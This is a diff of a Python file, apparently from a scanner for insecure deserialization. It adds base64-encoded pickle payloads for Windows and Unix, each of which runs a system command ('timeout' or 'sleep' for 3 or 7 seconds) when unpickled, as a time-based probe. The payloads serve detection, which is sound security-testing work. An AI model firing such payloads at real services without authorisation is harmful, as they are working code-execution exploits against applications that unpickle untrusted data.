@@ -36,7 +36,7 @@ SA SUBRPOCESS NIJE TAKO!!!!!!!!!!!!, koristiti subprocess umjesto os.sysyem?
 """
 
 """ 
-previously constructed payloads calling sleep [3,4,5,6] seconds
+previously constructed payloads calling sleep [3,7] seconds
 each payload is pickled with all 6 pickle protocols and base64 encoded
 
 these are not generated on the fly for two reasons:
@@ -51,17 +51,39 @@ these are not generated on the fly for two reasons:
 
 
 win_sleep_prepickled = [
-    # sleep 3
-    "",
-    "",
-    "",
-    "",
-    "",
-    "",
-    
-
+    # timeout 3
+    "Y250CnN5c3RlbQpwMAooVnRpbWVvdXQgMwpwMQp0cDIKUnAzCi4=",
+    "Y250CnN5c3RlbQpxAChYCQAAAHRpbWVvdXQgM3EBdHECUnEDLg==",
+    "gAJjbnQKc3lzdGVtCnEAWAkAAAB0aW1lb3V0IDNxAYVxAlJxAy4=",
+    "gANjbnQKc3lzdGVtCnEAWAkAAAB0aW1lb3V0IDNxAYVxAlJxAy4=",
+    "gASVIQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAl0aW1lb3V0IDOUhZRSlC4=",
+    "gAWVIQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAl0aW1lb3V0IDOUhZRSlC4=",
+    #timeout 7 
+    "Y250CnN5c3RlbQpwMAooVnRpbWVvdXQgNwpwMQp0cDIKUnAzCi4=",
+    "Y250CnN5c3RlbQpxAChYCQAAAHRpbWVvdXQgN3EBdHECUnEDLg==",
+    "gAJjbnQKc3lzdGVtCnEAWAkAAAB0aW1lb3V0IDdxAYVxAlJxAy4=",
+    "gANjbnQKc3lzdGVtCnEAWAkAAAB0aW1lb3V0IDdxAYVxAlJxAy4=",
+    "gASVIQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAl0aW1lb3V0IDeUhZRSlC4=",
+    "gAWVIQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAl0aW1lb3V0IDeUhZRSlC4="
 ]
 
+
+nix_sleep_prepickled = [
+    # sleep 3
+    "Y3Bvc2l4CnN5c3RlbQpwMAooVnNsZWVwIDMKcDEKdHAyClJwMwou",
+    "Y3Bvc2l4CnN5c3RlbQpxAChYBwAAAHNsZWVwIDNxAXRxAlJxAy4=",
+    "gAJjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCAzcQGFcQJScQMu",
+    "gANjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCAzcQGFcQJScQMu",
+    "gASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCAzlIWUUpQu",
+    "gAWVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCAzlIWUUpQu",
+    #sleep 7 
+    "Y3Bvc2l4CnN5c3RlbQpwMAooVnNsZWVwIDcKcDEKdHAyClJwMwou",
+    "Y3Bvc2l4CnN5c3RlbQpxAChYBwAAAHNsZWVwIDdxAXRxAlJxAy4=",
+    "gAJjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCA3cQGFcQJScQMu",
+    "gANjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCA3cQGFcQJScQMu",
+    "gASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA3lIWUUpQu",
+    "gAWVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA3lIWUUpQu"
+]
 
 sleep_nix = [
     "sleep 3",
